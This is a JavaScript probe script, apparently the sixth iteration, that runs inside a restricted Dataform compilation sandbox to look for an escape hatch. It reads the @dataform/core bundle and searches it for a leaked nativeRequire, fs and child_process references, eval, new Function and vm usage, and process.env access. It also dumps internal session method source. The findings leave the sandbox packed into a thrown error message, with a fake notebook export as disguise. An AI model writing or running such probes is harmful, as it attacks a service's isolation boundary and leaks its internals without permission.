// v6 — find escape hatch in bundle. Search for native require leaks, exports of `p`/helpers.

var out = {};
function safe(k, fn) {
  try { var v = fn(); out[k] = (typeof v === 'string' ? v : JSON.stringify(v)).substring(0, 3000); }
  catch(e) { out[k] = 'ERR:' + (e.message || String(e)).substring(0, 400); }
}

var BUNDLE = restricted_fs.readFile('node_modules/@dataform/core/bundle.js').toString();
out.BUNDLE_SIZE = BUNDLE.length;

// ============ Find the helper module that exports nativeRequire ============
// Pattern: `t.nativeRequire = require;` — at offset 260977 per prior probe
safe('A1_helper_module_full', function() {
  var idx = BUNDLE.indexOf('t.nativeRequire = require;');
  if (idx < 0) idx = BUNDLE.indexOf('t.nativeRequire=require');
  if (idx < 0) return 'not_found';
  // Walk back to find module wrapper start
  // Webpack pattern: `function(e,t,r){...t.nativeRequire=require...}`
  // Or `(e,t,r)=>{...t.nativeRequire=require...}`
  var start = Math.max(0, idx - 3000);
  var end = Math.min(BUNDLE.length, idx + 1500);
  return BUNDLE.substring(start, end);
});

// ============ Find ALL `require(N)` calls (webpack module IDs) ============
safe('A2_webpack_require_ids', function() {
  // Webpack uses r(N) where N is module ID
  var pat = /[rabc]\(([0-9]+)\)/g;
  var counts = {};
  var m;
  while ((m = pat.exec(BUNDLE)) !== null) {
    counts[m[1]] = (counts[m[1]] || 0) + 1;
  }
  var sorted = Object.entries(counts).sort((a,b)=>b[1]-a[1]).slice(0,20);
  return JSON.stringify(sorted);
});

// ============ Look for module list (webpack puts modules as array) ============
safe('A3_webpack_module_array_start', function() {
  // The webpack bundle starts with module array like [function(){...}, function(){...}, ...]
  // The first '[' followed by 'function' or '(e,t' pattern
  var idx = BUNDLE.search(/\[\s*function/);
  if (idx >= 0) return 'first [function at offset ' + idx + ' context:' + BUNDLE.substring(idx, idx + 500);
  idx = BUNDLE.search(/\[\(e,t/);
  if (idx >= 0) return 'first [(e,t at offset ' + idx + ' context:' + BUNDLE.substring(idx, idx + 500);
  return 'no module array';
});

// ============ Look at the top of bundle — webpack runtime ============
safe('B1_bundle_top_1000', function() { return BUNDLE.substring(0, 1500); });
safe('B2_bundle_end_2000', function() { return BUNDLE.substring(BUNDLE.length - 2000); });

// ============ Look for `module.exports = ` or `exports.main` near the end ============
safe('B3_module_exports_pattern', function() {
  // Webpack's UMD exports
  var pat = /module\.exports\s*=/g;
  var matches = [];
  var m;
  while ((m = pat.exec(BUNDLE)) !== null && matches.length < 5) {
    matches.push({offset: m.index, ctx: BUNDLE.substring(Math.max(0, m.index - 100), m.index + 200)});
  }
  return JSON.stringify(matches);
});

// ============ Find any references to native modules in bundle ============
safe('C1_fs_references', function() {
  var pat = /require\(["']fs["']\)|nativeRequire\(["']fs["']\)/g;
  var matches = BUNDLE.match(pat);
  return matches ? matches.length + ' matches' : 'none';
});

safe('C2_child_process_references', function() {
  var pat = /["']child_process["']/g;
  var matches = BUNDLE.match(pat);
  return matches ? matches.length + ' matches' : 'none';
});

safe('C3_process_global_refs', function() {
  // process.env or process.cwd patterns
  var matches1 = (BUNDLE.match(/process\.env/g) || []).length;
  var matches2 = (BUNDLE.match(/process\.cwd/g) || []).length;
  var matches3 = (BUNDLE.match(/process\.argv/g) || []).length;
  return 'env=' + matches1 + ' cwd=' + matches2 + ' argv=' + matches3;
});

// ============ Look for Function constructor / eval / new Function patterns inside bundle ============
safe('D1_new_function_patterns', function() {
  var pat = /new\s+Function\(/g;
  var matches = BUNDLE.match(pat);
  return matches ? matches.length + ' matches' : 'none';
});

safe('D2_eval_patterns', function() {
  var pat = /\beval\s*\(/g;
  var matches = BUNDLE.match(pat);
  return matches ? matches.length + ' matches' : 'none';
});

// ============ Look for VM module usage inside bundle ============
safe('E1_vm_usage', function() {
  var pat = /require\(["']vm["']\)|\.compileModule|\.runInNewContext/g;
  var matches = BUNDLE.match(pat);
  return matches ? JSON.stringify(matches.slice(0, 10)) : 'none';
});

// ============ Find ALL exports.X patterns to map the helper module's exports ============
safe('F1_helper_module_exports', function() {
  var helperIdx = BUNDLE.indexOf('t.nativeRequire');
  if (helperIdx < 0) return 'no helper';
  // Walk forward from helperIdx, find all 't.<name>'
  var slice = BUNDLE.substring(helperIdx, helperIdx + 3000);
  var pat = /t\.([a-zA-Z_$][\w$]*)\s*=/g;
  var exports_list = [];
  var m;
  while ((m = pat.exec(slice)) !== null) {
    exports_list.push({name: m[1], rel_offset: m.index});
  }
  return JSON.stringify(exports_list);
});

// ============ Find how `p` is initialized in core.main scope ============
safe('G1_p_definition_in_main', function() {
  // Find around `t.main=function(e)` and look for `p` definitions before it
  var idx = BUNDLE.indexOf('t.main=function');
  if (idx < 0) return 'main not found';
  // Look backward for module wrapping start
  var preCtx = BUNDLE.substring(Math.max(0, idx - 800), idx);
  return preCtx;
});

// ============ Walk session prototype methods for nativeRequire-using ones ============
safe('H1_session_publish_src', function() {
  return String(global._DF_SESSION.publish).substring(0, 1500);
});

safe('H2_session_operate_src', function() {
  return String(global._DF_SESSION.operate).substring(0, 1500);
});

safe('H3_session_notebook_src', function() {
  return String(global._DF_SESSION.notebook).substring(0, 2000);
});

module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };
throw new Error('PROBE_v6:' + JSON.stringify(out));
